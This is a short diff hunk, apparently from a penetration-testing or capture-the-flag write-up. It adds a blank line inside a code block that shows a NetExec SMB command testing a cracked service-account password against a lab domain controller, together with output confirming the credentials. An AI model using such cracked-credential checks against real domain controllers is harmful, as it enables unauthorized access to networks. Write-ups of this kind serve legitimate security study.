@@ -564,6 +564,7 @@ First check: does the crack hold up on the DC?
 ```bash
 ➜ nxc smb 10.0.10.5 \
     -u svc_mssql -p 'sqls3rv3r'
+
 SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
 SMB         10.0.10.5       445    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
 ```
